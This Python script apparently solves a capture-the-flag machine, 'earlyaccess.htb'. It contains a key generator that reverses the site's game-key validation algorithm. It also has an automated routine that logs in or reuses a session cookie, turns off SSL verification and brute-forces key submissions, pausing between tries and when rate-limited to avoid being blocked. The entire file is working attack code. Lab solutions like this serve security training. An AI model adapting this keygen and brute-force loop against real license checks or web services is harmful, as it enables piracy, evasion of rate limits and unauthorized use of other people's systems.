#!/usr/bin/env python3
import requests # To make web-requests
import sys # For input-verification
import argparse # For argument-parsing
import string # For key-calculation
from random import randrange # For random numbers
from typing import List # For type hinting

#################
# KEY FUNCTIONS #
#################

def gen_g1() -> str:
    """
    Calculates the first group of the key (g1)
    """
    g1 = []
    target = [221,81,145]

    # Calculate each g1 according to target
    while len(g1) != 3:
        g1.append({(ord(v)<<len(g1)+1)%256^ord(v):v for v in string.ascii_uppercase}[target[len(g1)]])

    # Add random numbers
    g1.append(str(randrange(0,5)))
    g1.append(str(randrange(5,10)))
    
    return "".join(g1)

def gen_g2() -> str:
    """
    Calculates the second group of the key (g2)
    """
    g2 = []
    values = string.ascii_uppercase + string.digits

    for x in values:
        for y in values:
            if ord(x)*3 == ord(y)*2:
                g2.append((x+y) * 2 + x)
    return g2[randrange(0,len(g2))]

def gen_g3(magic_num:int, magic_value:str="XP") -> str:
    """
    Calculates third group of key (g3) using `magic_num` (optional) and `magic_value` (Default: XP)
    - `magic_num`   --  Target sum of all chars in g3
    - `magic_value` --  Known part of Key's g3 (magic_value)
    """
    # Get value of the two remaining letters + num
    remain = magic_num - sum(bytearray(magic_value.encode()))

    for num in range(ord("0"), ord("9")+1): # Try each number
        target = remain - num # Remove number from target value
        if target % 2 == 0: # If target value is even
            half = int(target / 2) # Get half value
            if half >= ord("A") and half <= ord("Z"): # Check if half is ASCII printable
                return f"XP{2*chr(half)}{chr(num)}" # Add same chr(half) twice
        if (target - 65) >= ord("A") and (target - 65) <= ord("Z"):
            return f"XPA{chr(target-65)}{chr(num)}" # Add "A" and char

def gen_g4(g1:str) -> str:
    """
    Calculates fourth group of key (g4) using the first group
    - `g1`  --  First group of key (g1)
    """
    return "".join([chr(i^ord(g)) for g, i in zip(list(g1), [12, 4, 20, 117, 0])])

def calc_cs(key:str) -> int:
    """
    Calculates checksum for key
    """
    gs = key.split('-')
    return sum([sum(bytearray(g.encode())) for g in gs])

def gen_key(magic_num:int=-1) -> List[str]:
    """
    Returns a list of valid keys (if no `magic_num` is set) or returns one possible key for given `magic_num`
    - `magic_num`   --  Calculate matching key for `magic_num`
    """
    keys = []
    if magic_num == -1:
        for magic_num in range(sum(bytearray(b"XPAA0")), sum(bytearray(b"XPZZ9"))+1):
            g1 = gen_g1()
            key = f"{g1}-{gen_g2()}-{gen_g3(magic_num)}-{gen_g4(g1)}"
            key += f"-{calc_cs(key)}" # Calculate checksum
            keys.append(key)
        print(f"[+] Generated {len(keys)} keys!")
        return keys
    else:
        g1 = gen_g1()
        key = f"{g1}-{gen_g2()}-{gen_g3(magic_num)}-{gen_g4(g1)}"
        key += f"-{calc_cs(key)}" # Calculate checksum
        keys.append(key)
        return keys

##################
# HTTP FUNCTIONS #
##################

import requests
from time import sleep, time
from bs4 import BeautifulSoup

# Ignore ssl-errors
import urllib3
urllib3.disable_warnings()

# URL of webpage
url = "https://earlyaccess.htb"
proxies = {}

def login(session:requests.Session, email:str, password:str) -> requests.Session:
    """
    Uses `email` and `password` to login and returns a valid `session`, if login was successful
    """
    res = session.get(f"{url}/login", proxies=proxies)
    soup = BeautifulSoup(res.text, features='lxml')
    token = soup.find('input',{'type':'hidden'}).attrs["value"]
    data = {'_token':token,'email':email, 'password':password}
    resp = session.post(f"{url}/login", proxies=proxies, data=data)
    return "dashboard" in resp.url

def submit_key(session:requests.Session, key:str) -> bool:
    """
    Uses `session` to submit a key and returns `True`, if the key successfully registered to the account
    """
    res = session.get(f"{url}/key", proxies=proxies)
    soup = BeautifulSoup(res.text, features='lxml')
    token = soup.find('input',{'type':'hidden'}).attrs["value"]
    data = {'_token':token, 'key':key}

    resp = session.post(f"{url}/key/add", data=data, proxies=proxies)
    soup = BeautifulSoup(resp.text, features='lxml')
    out = soup.find('div',{'class':'toast-body'})
    if out:
        out = out.text
    else:
        return False

    if "Game-key successfully added" in out or "Game-key is valid" in out:
        return True
    elif "Game-key is invalid" in out:
        return False
    elif "Too many requests" in out:
        print(f"[!] Got blocked! Waiting 60 seconds and then retrying...")
        sleep(60)
        # Retry after 60 seconds
        submit_key(session, key)
    else:
        print(f"[!] Unexpected result: {out}")
        return False

def clear(count:int=1) -> None:
    """
    Clears `count` rows on terminal
    """
    for i in range(count):
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")

#################
# MAIN FUNCTION #
#################

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Game-Key generation script by Chr0x6eos")
    parser.add_argument("--email", help="Email of your account", type=str)
    parser.add_argument("--password", help="Password of your account", type=str)
    parser.add_argument("-c", "--cookie", help="Cookie to use", type=str)
    parser.add_argument("-d", "--delay", help="Delay between requests (in seconds)", metavar="1", type=float)
    parser.add_argument("-p", "--proxy", help="HTTP proxy", metavar="http://127.0.0.1:8080", type=str)
    parser.add_argument("-m", "--magic_num", help="Magic number to use", metavar="[346-406]", choices=range(346,405+1), type=int)
    parser.add_argument("-l", "--local", help="Only calculate key, do not submit", action='store_true')
    args = parser.parse_args()

    # Print help if no arguments were supplient
    if not any(vars(args).values()):
        parser.print_help()
        quit()

    if args.local:
        """
        Calculate keys locally
        """
        if args.magic_num:
            magic_num = args.magic_num
        else:
            magic_num = -1
        
        keys = gen_key(magic_num)
        print("\r\n".join(keys))
        quit()
    else:
        """
        Submit keys against website
        """
        if not (args.email and args.password) and not args.cookie:
            parser.print_usage()
            print("\nWhen not using --local either (--email and --password) or --cookie is required!")
            quit()

        session = requests.Session()
        session.verify = False

        if args.proxy:
            proxies = {'http':args.proxy, 'https':args.proxy}
    
        if args.cookie:
            session.cookies.set("earlyaccess_session",args.cookie,domain="earlyaccess.htb")
        else:
            email = args.email
            password = args.password

            if not login(session, email, password):
                print(f"[-] Could not login as {email} with password: {password}!")
                quit()

        if not args.delay:
            args.delay = 0.5

        if args.magic_num:
            magic_num = args.magic_num
        else:
            magic_num = -1
        
        keys = gen_key(magic_num)

        print(f"[*] Testing {len(keys)} possible keys!\r\n")
        
        # Stop execution time
        start_time = time()
        for index, key in enumerate(keys, start=1):
            progress = index / len(keys) * 100

            if progress < 10:
                clear()
                print(f"[{progress:0.2f}%]  Trying key: {key}")
            else:
                clear()
                print(f"[{progress:0.2f}%] Trying key: {key}")
            if submit_key(session, key):
                clear()
                if args.cookie:
                    print(f"[+] Successfully registered valid key: {key} to account (cookie: {args.cookie}) after a total of {index} requests that took {time() - start_time:0.2f} seconds!")
                else:
                    print(f"[+] Successfully registered valid key: {key} to account {args.email} after a total of {index} requests that took {time() - start_time:0.2f} seconds!")
                print(f"[INFO] Magic_num of the API currently is: {sum(bytearray(key.split('-')[2].encode()))}")
                quit()
            
            # Sleep delay second between each request to not get blocked
            sleep(args.delay)
        
        print(f"[-] Could not find valid key! Please retry...")
